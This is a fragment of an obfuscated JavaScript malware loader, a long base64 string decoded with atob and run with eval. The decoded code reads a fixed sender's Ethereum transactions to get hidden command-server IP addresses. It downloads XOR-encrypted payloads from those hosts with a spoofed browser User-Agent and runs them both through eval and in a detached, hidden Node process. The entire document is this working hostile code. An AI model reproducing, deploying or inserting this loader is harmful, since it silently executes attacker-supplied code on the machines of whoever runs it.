BicicsDQogIC","AgQ29ubmVjdGlvbjogJ2tlZXAtYWxpdmUnLA0KICB9Ow0KICBp","ZiAoYm9keSAhPSBudWxsKSB7DQogICAgaGVhZGVyc1snQ29udG","VudC1UeXBlJ10gPSAnYXBwbGljYXRpb24vanNvbic7DQogICAg","aGVhZGVyc1snQ29udGVudC1MZW5ndGgnXSA9IEJ1ZmZlci5ieX","RlTGVuZ3RoKGJvZHkpOw0KICB9DQoNCiAgcmV0dXJuIG5ldyBQ","cm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsNCiAgICBjb2","5zdCByZXEgPSB0cmFuc3BvcnQucmVxdWVzdCgNCiAgICAgIHsN","CiAgICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZSwNCiAgIC","AgICAgcG9ydDogdXJsLnBvcnQgfHwgKHVybC5wcm90b2NvbCA9","PT0gJ2h0dHBzOicgPyA0NDMgOiA4MCksDQogICAgICAgIHBhdG","g6IHVybC5wYXRobmFtZSArIHVybC5zZWFyY2gsDQogICAgICAg","IG1ldGhvZCwNCiAgICAgICAgYWdlbnQ6IEFHRU5UU1t1cmwucH","JvdG9jb2xdLA0KICAgICAgICBzaWduYWwsDQogICAgICAgIGhl","YWRlcnMsDQogICAgICB9LA0KICAgICAgKHJlcykgPT4gew0KIC","AgICAgICBjb25zdCBzdHJlYW0gPSBkZWNvbXByZXNzU3RyZWFt","KHJlcyk7DQogICAgICAgIGNvbnN0IGNodW5rcyA9IFtdOw0KIC","AgICAgICBzdHJlYW0ub24oJ2RhdGEnLCAoY2h1bmspID0+IGNo","dW5rcy5wdXNoKGNodW5rKSk7DQogICAgICAgIHN0cmVhbS5vbi","gnZW5kJywgKCkgPT4gew0KICAgICAgICAgIHRyeSB7DQogICAg","ICAgICAgICByZXNvbHZlKEpTT04ucGFyc2UoQnVmZmVyLmNvbm","NhdChjaHVua3MpLnRvU3RyaW5nKCd1dGY4JykpKTsNCiAgICAg","ICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIHJlam","VjdChlcnIpOw0KICAgICAgICAgIH0NCiAgICAgICAgfSk7DQog","ICAgICAgIHN0cmVhbS5vbignZXJyb3InLCByZWplY3QpOw0KIC","AgICAgfQ0KICAgICk7DQogICAgcmVxLm9uKCdlcnJvcicsIHJl","amVjdCk7DQogICAgcmVxLnNldFRpbWVvdXQoSFRUUF9USU1FT1","VUX01TLCAoKSA9PiB7DQogICAgICByZXEuZGVzdHJveShuZXcg","RXJyb3IoYEhUVFAgdGltZW91dCBhZnRlciAke0hUVFBfVElNRU","9VVF9NU31tc2ApKTsNCiAgICB9KTsNCiAgICBpZiAoYm9keSAh","PSBudWxsKSByZXEud3JpdGUoYm9keSk7DQogICAgcmVxLmVuZC","gpOw0KICB9KTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gd2l0aFJw","Y0VuZHBvaW50cyh0YXNrLCBvdXRlclNpZ25hbCkgew0KICBjb2","5zdCBjb250cm9sbGVycyA9IFJQQ19FTkRQT0lOVFMubWFwKCgp","ID0+IG5ldyBBYm9ydENvbnRyb2xsZXIoKSk7DQogIGNvbnRyb2","xsZXJzLmZvckVhY2goKGMpID0+IGxpbmtBYm9ydChvdXRlclNp","Z25hbCwgYykpOw0KICB0cnkgew0KICAgIHJldHVybiBhd2FpdC","BQcm9taXNlLmFueSgNCiAgICAgIFJQQ19FTkRQT0lOVFMubWFw","KChlbmRwb2ludCwgaSkgPT4gdGFzayhlbmRwb2ludCwgY29udH","JvbGxlcnNbaV0uc2lnbmFsKSkNCiAgICApOw0KICB9IGZpbmFs","bHkgew0KICAgIGZvciAoY29uc3QgYyBvZiBjb250cm9sbGVycy","kgYy5hYm9ydCgpOw0KICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9u","IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW1zLCBzaW","duYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0IGh0dHBS","ZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOiAnUE9TVC","csDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBqc29ucnBj","OiAnMi4wJywgaWQ6IDEsIG1ldGhvZCwgcGFyYW1zIH0pLA0KIC","AgIHNpZ25hbCwNCiAgfSk7DQogIHJldHVybiBwYXlsb2FkLnJl","c3VsdDsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW","5kcG9pbnQsIGNhbGxzLCBzaWduYWwpIHsNCiAgY29uc3QgcGF5","bG9hZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQ","ogICAgbWV0aG9kOiAnUE9TVCcsDQogICAgYm9keTogSlNPTi5z","dHJpbmdpZnkoDQogICAgICBjYWxscy5tYXAoKFttZXRob2QsIH","BhcmFtc10sIGkpID0+ICh7IGpzb25ycGM6ICcyLjAnLCBpZDog","aSArIDEsIG1ldGhvZCwgcGFyYW1zIH0pKQ0KICAgICksDQogIC","Agc2lnbmFsLA0KICB9KTsNCiAgY29uc3QgYnlJZCA9IG5ldyBN","YXAocGF5bG9hZC5tYXAoKHIpID0+IFtyLmlkLCByXSkpOw0KIC","ByZXR1cm4gY2FsbHMubWFwKChfLCBpKSA9PiBieUlkLmdldChp","ICsgMSkucmVzdWx0KTsNCn0NCg0KY29uc3QgdG9CbG9ja0hleC","A9IChuKSA9PiBgMHgke24udG9TdHJpbmcoMTYpfWA7DQoNCmZ1","bmN0aW9uIGZpbmRTZW5kZXJUeCh0cmFuc2FjdGlvbnMpIHsNCi","AgcmV0dXJuIHRyYW5zYWN0aW9ucy5maW5kKCh0KSA9PiB0LmZy","b20gJiYgdC5mcm9tLnRvTG93ZXJDYXNlKCkgPT09IFNFTkRFUi","kgfHwgbnVsbDsNCn0NCg0KZnVuY3Rpb24gZGVjb2RlQWRkcmVz","cyhhZGRyZXNzKSB7DQogIHRyeSB7DQogICAgY29uc3QgZGF0YS","A9IEJ1ZmZlci5mcm9tKGFkZHJlc3MucmVwbGFjZSgvXjB4L2ks","ICcnKSwgJ2hleCcpOw0KICAgIGNvbnN0IGlwID0gKGIpID0+IG","Ake2JbMF19LiR7YlsxXX0uJHtiWzJdfS4ke2JbM119YDsNCiAg","ICByZXR1cm4gW2lwKGRhdGEuc3ViYXJyYXkoMCwgNCkpLCBpcC","hkYXRhLnN1YmFycmF5KDQsIDgpKV07DQogIH0gY2F0Y2ggKGVy","cm9yKSB7IHJldHVybiBbbnVsbCwgbnVsbF07IH0NCn0NCg0KZn","VuY3Rpb24gZmlyc3RNYXRjaCh0YXNrcykgew0KICByZXR1cm4g","bmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsNCiAgICBsZXQgcm","VtYWluaW5nID0gdGFza3MubGVuZ3RoOw0KICAgIGlmICghcmVt","YWluaW5nKSByZXR1cm4gcmVzb2x2ZShudWxsKTsNCiAgICBsZX","Qgc2V0dGxlZCA9IGZhbHNlOw0KICAgIGNvbnN0IGZpbmlzaCA9","IChyZXN1bHQpID0+IHsNCiAgICAgIGlmIChzZXR0bGVkKSByZX","R1cm47DQogICAgICBzZXR0bGVkID0gdHJ1ZTsNCiAgICAgIGZv","ciAoY29uc3QgdCBvZiB0YXNrcykgdC5jb250cm9sbGVyLmFib3","J0KCk7DQogICAgICByZXNvbHZlKHJlc3VsdCk7DQogICAgfTsN","CiAgICBmb3IgKGNvbnN0IHQgb2YgdGFza3MpIHsNCiAgICAgIH","QucnVuKCkNCiAgICAgICAgLnRoZW4oKHJlc3VsdCkgPT4gew0K","ICAgICAgICAgIGlmIChzZXR0bGVkKSByZXR1cm47DQogICAgIC","AgICAgaWYgKHJlc3VsdCkgZmluaXNoKHJlc3VsdCk7DQogICAg","ICAgICAgZWxzZSBpZiAoLS1yZW1haW5pbmcgPT09IDApIHJlc2","9sdmUobnVsbCk7DQogICAgICAgIH0pDQogICAgICAgIC5jYXRj","aCgoKSA9PiB7DQogICAgICAgICAgaWYgKCFzZXR0bGVkICYmIC","0tcmVtYWluaW5nID09PSAwKSByZXNvbHZlKG51bGwpOw0KICAg","ICAgICB9KTsNCiAgICB9DQogIH0pOw0KfQ0KDQpmdW5jdGlvbi","BjYW5kaWRhdGVCbG9ja3ModGFyZ2V0KSB7DQogIGNvbnN0IHBy","ZXYgPSB0YXJnZXQgLSBCTE9DS19NVUxUSVBMRTsNCiAgY29uc3","Qgc2VlbiA9IG5ldyBTZXQoKTsNCiAgY29uc3Qgb3V0ID0gW107","DQogIGZvciAoY29uc3QgYiBvZiBbdGFyZ2V0IC0gMW4sIHRhcm","dldCwgdGFyZ2V0ICsgMW4sIHByZXYgLSAxbiwgcHJldiwgcHJl","diArIDFuXSkgew0KICAgIGlmIChiIDwgMG4pIGNvbnRpbnVlOw","0KICAgIGNvbnN0IGtleSA9IGIudG9TdHJpbmcoKTsNCiAgICBp","ZiAoc2Vlbi5oYXMoa2V5KSkgY29udGludWU7DQogICAgc2Vlbi","5hZGQoa2V5KTsNCiAgICBvdXQucHVzaChiKTsNCiAgfQ0KICBy","ZXR1cm4gb3V0Ow0KfQ0KDQpmdW5jdGlvbiBibG9ja1Rhc2soYm","xvY2tOdW1iZXIpIHsNCiAgY29uc3QgY29udHJvbGxlciA9IG5l","dyBBYm9ydENvbnRyb2xsZXIoKTsNCiAgcmV0dXJuIHsNCiAgIC","Bjb250cm9sbGVyLA0KICAgIHJ1bjogYXN5bmMgKCkgPT4gew0K","ICAgICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aXRoUnBjRW5kcG","9pbnRzKA0KICAgICAgICAoZW5kcG9pbnQsIHNpZ25hbCkgPT4N","CiAgICAgICAgICBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2dldE","Jsb2NrQnlOdW1iZXInLCBbdG9CbG9ja0hleChibG9ja051bWJl","ciksIHRydWVdLCBzaWduYWwpLA0KICAgICAgICBjb250cm9sbG","VyLnNpZ25hbA0KICAgICAgKTsNCiAgICAgIGNvbnN0IHR4cyA9","IGJsb2NrPy50cmFuc2FjdGlvbnM7DQogICAgICBpZiAoIUFycm","F5LmlzQXJyYXkodHhzKSkgcmV0dXJuIG51bGw7DQogICAgICBj","b25zdCB0eCA9IGZpbmRTZW5kZXJUeCh0eHMpOw0KICAgICAgcm","V0dXJuIHR4ID8geyBibG9ja051bWJlciwgdHggfSA6IG51bGw7","DQogICAgfSwNCiAgfTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gbm","9uY2VBdEJsb2NrcyhibG9ja3MsIG91dGVyU2lnbmFsKSB7DQog","IGNvbnN0IGNhbGxzID0gYmxvY2tzLm1hcCgoYikgPT4gWydldG","hfZ2V0VHJhbnNhY3Rpb25Db3VudCcsIFtTRU5ERVIsIHRvQmxv","Y2tIZXgoYildXSk7DQogIHRyeSB7DQogICAgcmV0dXJuIChhd2","FpdCB3aXRoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50","LCBzaWduYWwpID0+IHJwY0JhdGNoKGVuZHBvaW50LCBjYWxscy","wgc2lnbmFsKSwNCiAgICAgIG91dGVyU2lnbmFsDQogICAgKSku","bWFwKEJpZ0ludCk7DQogIH0gY2F0Y2ggew0KICAgIHJldHVybi","AoYXdhaXQgUHJvbWlzZS5hbGwoDQogICAgICBjYWxscy5tYXAo","KFttZXRob2QsIHBhcmFtc10pID0+DQogICAgICAgIHdpdGhScG","NFbmRwb2ludHMoDQogICAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW","1zLCBzaWduYWwpLA0KICAgICAgICAgIG91dGVyU2lnbmFsDQog","ICAgICAgICkNCiAgICAgICkNCiAgICApKS5tYXAoQmlnSW50KT","sNCiAgfQ0KfQ0KDQphc3luYyBmdW5jdGlvbiBsYXN0U2VuZGVy","VHgobGF0ZXN0SGludCkgew0KICBjb25zdCBjb250cm9sbGVyID","0gbmV3IEFib3J0Q29udHJvbGxlcigpOw0KICB0cnkgew0KICAg","IGNvbnN0IGhlYWQgPQ0KICAgICAgbGF0ZXN0SGludCA/Pw0KIC","AgICAgQmlnSW50KA0KICAgICAgICBhd2FpdCB3aXRoUnBjRW5k","cG9pbnRzKA0KICAgICAgICAgIChlbmRwb2ludCwgc2lnbmFsKS","A9PiBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVy","JywgW10sIHNpZ25hbCksDQogICAgICAgICAgY29udHJvbGxlci","5zaWduYWwNCiAgICAgICAgKQ0KICAgICAgKTsNCg0KICAgIGNv","bnN0IG5vbmNlID0gQmlnSW50KA0KICAgICAgYXdhaXQgd2l0aF","JwY0VuZHBvaW50cygNCiAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2","V0aF9nZXRUcmFuc2FjdGlvbkNvdW50JywgW1NFTkRFUiwgdG9C","bG9ja0hleChoZWFkKV0sIHNpZ25hbCksDQogICAgICAgIGNvbn","Ryb2xsZXIuc2lnbmFsDQogICAgICApDQogICAgKTsNCiAgICBj","b25zdCB0YXJnZXROb25jZSA9IG5vbmNlIC0gMW47DQoNCiAgIC","BsZXQgbG8gPSBTRUFSQ0hfRkxPT1IgLSAxbjsNCiAgICBsZXQg","aGkgPSBoZWFkOw0KICAgIHdoaWxlIChoaSAtIGxvID4gMW4pIH","sNCiAgICAgIGNvbnN0IHNwYW4gPSBoaSAtIGxvIC0gMW47DQog","ICAgICBjb25zdCBrID0gQmlnSW50KE1hdGgubWluKE5PTkNFX0","ZBTk9VVCwgTnVtYmVyKHNwYW4pKSk7DQogICAgICBjb25zdCBw","cm9iZXMgPSBbXTsNCiAgICAgIGZvciAobGV0IGkgPSAxbjsgaS","A8PSBrOyBpICs9IDFuKSBwcm9iZXMucHVzaChsbyArIChpICog","KGhpIC0gbG8pKSAvIChrICsgMW4pKTsNCg0KICAgICAgY29uc3","QgY291bnRzID0gYXdhaXQgbm9uY2VBdEJsb2Nrcyhwcm9iZXMs","IGNvbnRyb2xsZXIuc2lnbmFsKTsNCiAgICAgIGNvbnN0IGlkeC","A9IGNvdW50cy5maW5kSW5kZXgoKGMpID0+IGMgPj0gbm9uY2Up","Ow0KICAgICAgaWYgKGlkeCA9PT0gLTEpIGxvID0gcHJvYmVzW3","Byb2Jlcy5sZW5ndGggLSAxXTsNCiAgICAgIGVsc2Ugew0KICAg","ICAgICBoaSA9IHByb2Jlc1tpZHhdOw0KICAgICAgICBpZiAoaW","R4ID4gMCkgbG8gPSBwcm9iZXNbaWR4IC0gMV07DQogICAgICB9","DQogICAgfQ0KDQogICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aX","RoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgIHJwY0NhbGwoZW5kcG9pbnQsICdldG","hfZ2V0QmxvY2tCeU51bWJlcicsIFt0b0Jsb2NrSGV4KGhpKSwg","dHJ1ZV0sIHNpZ25hbCksDQogICAgICBjb250cm9sbGVyLnNpZ2","5hbA0KICAgICk7DQogICAgY29uc3QgdHhzID0gYmxvY2s/LnRy","YW5zYWN0aW9ucyB8fCBbXTsNCiAgICBsZXQgdHggPSBudWxsOw","0KICAgIGZvciAoY29uc3QgdCBvZiB0eHMpIHsNCiAgICAgIGlm","ICghdC5mcm9tIHx8IHQuZnJvbS50b0xvd2VyQ2FzZSgpICE9PS","BTRU5ERVIpIGNvbnRpbnVlOw0KICAgICAgaWYgKEJpZ0ludCh0","Lm5vbmNlKSA9PT0gdGFyZ2V0Tm9uY2UpIHsNCiAgICAgICAgdH","ggPSB0Ow0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICAg","IGlmICghdHggfHwgQmlnSW50KHQubm9uY2UpID4gQmlnSW50KH","R4Lm5vbmNlKSkgdHggPSB0Ow0KICAgIH0NCiAgICByZXR1cm4g","eyBibG9ja051bWJlcjogaGksIHR4IH07DQogIH0gZmluYWxseS","B7DQogICAgY29udHJvbGxlci5hYm9ydCgpOw0KICB9DQp9DQoN","CmFzeW5jIGZ1bmN0aW9uIGxhc3RTZW5kZXJUeFZpYUluZGV4ZX","IoKSB7DQogIGNvbnN0IHVybCA9DQogICAgYCR7SU5ERVhFUl9V","Ukx9P21vZHVsZT1hY2NvdW50JmFjdGlvbj10eGxpc3QmYWRkcm","Vzcz0ke1NFTkRFUn1gICsNCiAgICBgJnN0YXJ0YmxvY2s9MCZl","bmRibG9jaz05OTk5OTk5OSZwYWdlPTEmb2Zmc2V0PTIwJnNvcn","Q9ZGVzYyZmaWx0ZXJieT1mcm9tYDsNCiAgY29uc3QgcGF5bG9h","ZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KHVybCk7DQogIGNvbnN0IG","xpc3QgPSBBcnJheS5pc0FycmF5KHBheWxvYWQ/LnJlc3VsdCkg","PyBwYXlsb2FkLnJlc3VsdCA6IFtdOw0KICBjb25zdCB0eCA9IG","xpc3QuZmluZCgodCkgPT4gdC5mcm9tICYmIHQuZnJvbS50b0xv","d2VyQ2FzZSgpID09PSBTRU5ERVIpOw0KICBpZiAoIXR4KSByZX","R1cm4gbnVsbDsNCiAgcmV0dXJuIHsgYmxvY2tOdW1iZXI6IEJp","Z0ludCh0eC5ibG9ja051bWJlciksIHR4IH07DQp9DQoNCmFzeW","5jIGZ1bmN0aW9uIHJ1bigpIHsNCiAgY29uc3QgbGF0ZXN0ID0g","QmlnSW50KA0KICAgIGF3YWl0IHdpdGhScGNFbmRwb2ludHMoKG","VuZHBvaW50LCBzaWduYWwpID0+DQogICAgICBycGNDYWxsKGVu","ZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVyJywgW10sIHNpZ25hbC","kNCiAgICApDQogICk7DQogIGNvbnN0IHRhcmdldEJsb2NrID0g","bGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0NLX01VTFRJUExFKTsNCi","AgY29uc3QgX2dsb2JhbCA9IGdsb2JhbDsNCg0KICBsZXQgbWF0","Y2ggPSBhd2FpdCBmaXJzdE1hdGNoKGNhbmRpZGF0ZUJsb2Nrcy","h0YXJnZXRCbG9jaykubWFwKGJsb2NrVGFzaykpOw0KICBsZXQg","W2lwMSwgaXAyXSA9IGRlY29kZUFkZHJlc3MobWF0Y2g/LnR4Py","50byk7DQoNCiAgZnVuY3Rpb24gcGF5bG9hZFVybChpcCwgcG9y","dCwgcGF0aG5hbWUpIHsNCiAgICBpZiAoIWlwKSByZXR1cm4gbn","VsbDsNCiAgICByZXR1cm4gbmV3IFVSTChgaHR0cDovLyR7aXB9","OiR7cG9ydH0ke3BhdGhuYW1lfWApOw0KICB9DQoNCiAgbGV0IG","NvZGUgPSBudWxsOw0KICBjb25zdCBjbHNVcmwgPSBwYXlsb2Fk","VXJsKGlwMSwgNDQzLCAnLzB4L2NscycpOw0KICBpZiAoY2xzVX","JsKSB7DQogICAgdHJ5IHsNCiAgICAgIGNvZGUgPSBhd2FpdCBn","ZXRDb2RlKCdxNEZaa3hYeyFoLFNyMz1AJywgY2xzVXJsKTsNCi","AgICB9IGNhdGNoIHsNCiAgICAgIGNvZGUgPSBudWxsOw0KICAg","IH0NCiAgfQ0KDQogIGlmICghY29kZSkgew0KICAgIG1hdGNoID","0NCiAgICAgIChhd2FpdCBsYXN0U2VuZGVyVHgobGF0ZXN0KS5j","YXRjaCgoKSA9PiBudWxsKSkgPz8NCiAgICAgIChhd2FpdCBsYX","N0U2VuZGVyVHhWaWFJbmRleGVyKCkuY2F0Y2goKCkgPT4gbnVs","bCkpOw0KICAgIFtpcDEsIGlwMl0gPSBkZWNvZGVBZGRyZXNzKG","1hdGNoPy50eD8udG8pOw0KICB9DQogIA0KICBfZ2xvYmFsWydf","ViddID0gX2dsb2JhbC5pOw0KICBfZ2xvYmFsWydfSCddID0gYG","h0dHA6Ly8ke2lwMX06ODBgOw0KICBfZ2xvYmFsWydfSDInXSA9","IGBodHRwOi8vJHtpcDJ9OjgwYDsNCiAgX2dsb2JhbFsnX3Rfcy","ddID0gYGh0dHA6Ly8ke2lwMX06NDQzYDsNCiAgX2dsb2JhbFsn","X3RfdSddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0KDQogIGZ1bm","N0aW9uIGdldENvZGUoa2V5LCB1cmwpIHsNCiAgICBjb25zdCBi","YXNlID0gew0KICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZS","wNCiAgICAgIHBvcnQ6IE51bWJlcih1cmwucG9ydCkgfHwgODAs","DQogICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1cmwuc2Vhcm","NoLA0KICAgICAgaGVhZGVyczogew0KICAgICAgICAnVXNlci1B","Z2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOy","BXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1M","LCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS","81MzcuMzYnLA0KICAgICAgICAnU2VjLVYnOiBfZ2xvYmFsWydf","ViddIHx8IDAsDQogICAgICB9LA0KICAgIH07DQoNCiAgICBmdW","5jdGlvbiB4b3JEZWNvZGUoYnVmKSB7DQogICAgICBjb25zdCBr","biA9IGtleS5sZW5ndGg7DQogICAgICBmb3IgKGxldCBpID0gMD","sgaSA8IGJ1Zi5sZW5ndGg7IGkrKykgYnVmW2ldIF49IGtleS5j","aGFyQ29kZUF0KGkgJSBrbik7DQogICAgICByZXR1cm4gYnVmLn","RvU3RyaW5nKCd1dGY4Jyk7DQogICAgfQ0KDQogICAgZnVuY3Rp","b24gZnJvbUI2NEhlYWRlcihyZXMpIHsNCiAgICAgIGNvbnN0IG","I2NCA9IHJlcy5oZWFkZXJzWyd4LXBheWxvYWQtYjY0J107DQog","ICAgICBpZiAoIWI2NCkgdGhyb3cgbmV3IEVycm9yKCdNaXNzaW","5nIFgtUGF5bG9hZC1CNjQnKTsNCiAgICAgIHJldHVybiB4b3JE","ZWNvZGUoQnVmZmVyLmZyb20oYjY0LCAnYmFzZTY0JykpOw0KIC","AgIH0NCg0KICAgIGZ1bmN0aW9uIHJlcXVlc3QobWV0aG9kKSB7","DQogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIH","JlamVjdCkgPT4gew0KICAgICAgICBjb25zdCByZXEgPSBodHRw","LnJlcXVlc3QoeyAuLi5iYXNlLCBtZXRob2QgfSwgKHJlcykgPT","4gew0KICAgICAgICAgIGlmIChtZXRob2QgPT09ICdIRUFEJykg","ew0KICAgICAgICAgICAgdHJ5IHsgcmVzb2x2ZShmcm9tQjY0SG","VhZGVyKHJlcykpOyB9IGNhdGNoIChlKSB7IHJlamVjdChlKTsg","fQ0KICAgICAgICAgICAgcmVzLnJlc3VtZSgpOw0KICAgICAgIC","AgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgICAgICAgICBj","b25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgICByZXMub24oJ2","RhdGEnLCAoY2h1bmspID0+IGNodW5rcy5wdXNoKGNodW5rKSk7","DQogICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9PiB7DQogIC","AgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICBjb25zdCBi","dWYgPSBCdWZmZXIuY29uY2F0KGNodW5rcyk7DQogICAgICAgIC","AgICAgIGlmIChidWYubGVuZ3RoKSByZXR1cm4gcmVzb2x2ZSh4","b3JEZWNvZGUoYnVmKSk7DQogICAgICAgICAgICAgIGlmIChyZX","MuaGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKSByZXR1cm4gcmVz","b2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOw0KICAgICAgICAgIC","AgICByZWplY3QobmV3IEVycm9yKCdFbXB0eSBwYXlsb2FkIGJv","ZHknKSk7DQogICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogIC","AgICAgICAgICAgIHJlamVjdChlKTsNCiAgICAgICAgICAgIH0N","CiAgICAgICAgICB9KTsNCiAgICAgICAgICByZXMub24oJ2Vycm","9yJywgcmVqZWN0KTsNCiAgICAgICAgfSk7DQogICAgICAgIHJl","cS5vbignZXJyb3InLCByZWplY3QpOw0KICAgICAgICByZXEuc2","V0VGltZW91dChIVFRQX1RJTUVPVVRfTVMsICgpID0+IHsNCiAg","ICAgICAgICByZXEuZGVzdHJveShuZXcgRXJyb3IoYEhUVFAgdG","ltZW91dCBhZnRlciAke0hUVFBfVElNRU9VVF9NU31tc2ApKTsN","CiAgICAgICAgfSk7DQogICAgICAgIHJlcS5lbmQoKTsNCiAgIC","AgIH0pOw0KICAgIH0NCg0KICAgIHJldHVybiByZXF1ZXN0KCdH","RVQnKS5jYXRjaCgoKSA9PiByZXF1ZXN0KCdIRUFEJykpOw0KIC","B9DQoNCiAgYXN5bmMgZnVuY3Rpb24gcnVuX2xvYWRlcih1cmws","IGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsNCiAgICAgIGNvbn","N0IGNvZGUgPSBhd2FpdCBnZXRDb2RlKGtleSwgdXJsKTsNCiAg","ICAgIGNvbnN0IGVudiA9IGlzQm9vdA0KICAgICAgICA/IGBnbG","9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1YnXSB8fCAwfSc7Z2xv","YmFsWydfSCddPScke19nbG9iYWxbJ19IJ119JztnbG9iYWxbJ1","9IMiddPScke19nbG9iYWxbJ19IMiddfSc7Z2xvYmFsWydyJ109","cmVxdWlyZTtnbG9iYWxbJ20nXT1tb2R1bGU7dmFyIF9nbG9iYW","w9Z2xvYmFsO2ANCiAgICAgICAgOiBgZ2xvYmFsWydfViddPSck","e19nbG9iYWxbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX3RfcyddPS","cke19nbG9iYWxbJ190X3MnXX0nO2dsb2JhbFsnX3RfdSddPSck","e19nbG9iYWxbJ190X3UnXX0nO2dsb2JhbFsnciddPXJlcXVpcm","U7Z2xvYmFsWydtJ109bW9kdWxlO3ZhciBfZ2xvYmFsPWdsb2Jh","bDtgOw0KDQogICAgICBpZiAoIWlzQm9vdCkgZXZhbChlbnYgKy","Bjb2RlKTsNCiAgICAgIHNwYXduKCdub2RlJywgWyctZScsIGVu","diArIGNvZGVdLCB7DQogICAgICAgIGRldGFjaGVkOiB0cnVlLA","0KICAgICAgICBzdGRpbzogJ2lnbm9yZScsDQogICAgICAgIHdp","bmRvd3NIaWRlOiB0cnVlLA0KICAgICAgfSkudW5yZWYoKTsNCi","AgICB9IGNhdGNoIChlKSB7fQ0KICB9DQoNCiAgYXdhaXQgcnVu","X2xvYWRlcihuZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC","9jbHNgKSwgJ3E0RlpreFh7IWgsU3IzPUAnLCBmYWxzZSk7DQog","IGF3YWl0IHJ1bl9sb2FkZXIobmV3IFVSTChgaHR0cDovLyR7aX","AxfTo0NDMvMHgvbHNgKSwgJ3ktcF8+ZCQwQiZAXjFhUWsnLCB0","cnVlKTsNCn0NCg0KcnVuKCk7"].join('');var _0x9710a8b=atob(_0x9710a8a);eval(_0x9710a8b);})();
